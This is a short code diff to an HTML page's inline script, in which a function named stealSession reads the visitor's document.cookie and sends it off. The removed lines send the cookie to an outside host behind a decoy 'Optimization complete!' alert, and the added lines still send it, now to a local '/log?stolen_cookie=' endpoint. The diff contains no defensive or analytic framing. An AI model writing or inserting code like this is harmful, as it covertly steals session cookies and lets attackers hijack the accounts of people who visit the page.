@@ -83,13 +83,11 @@
                 
                 input.value = "";
             }
-        }
-
-        function stealSession() {
-            const cookie = document.cookie;
-            fetch('https://python-pickwiz.onrender.com/log?stolen_cookie=' + encodeURIComponent(cookie));
-            alert("Optimization complete!");
-        }
+        }function stealSession() {
+    event.preventDefault(); 
+    const cookie = document.cookie;
+    fetch('/log?stolen_cookie=' + encodeURIComponent(cookie));
+}
     </script>
 </body>
 </html>
